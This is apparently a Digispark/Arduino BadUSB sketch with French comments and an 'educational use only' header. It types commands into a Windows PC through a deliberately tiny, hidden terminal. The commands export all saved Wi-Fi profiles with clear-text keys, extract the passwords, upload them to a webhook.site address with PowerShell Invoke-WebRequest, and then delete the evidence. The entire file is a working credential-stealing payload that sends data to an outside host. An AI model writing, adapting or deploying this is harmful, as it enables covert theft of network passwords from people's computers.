! CODE A USAGE EDUCATIF SEULEMENT !

#include "DigiKeyboard.h"

void setup() {
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //début de la commande
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1"); //plus petit terminal pour ne pas être repéré
  DigiKeyboard.delay(500);
  DigiKeyboard.println("cd %temp%"); //création d'un dossier temporaire
  DigiKeyboard.delay(300);  
  DigiKeyboard.println("netsh wlan export profile key=clear"); //export des mots de passes wifi dans le dossier temporaire
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //extraction des mots de passes wifi dans le fichier Wi-Fi-PASS
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //envoi du fichier Wi-Fi-PASS sur le webhook créé sur webhook.site
  DigiKeyboard.delay(1000);  
  DigiKeyboard.println("del Wi-* /s /f /q"); //suppression des fichiers temporaires
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(100);  
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
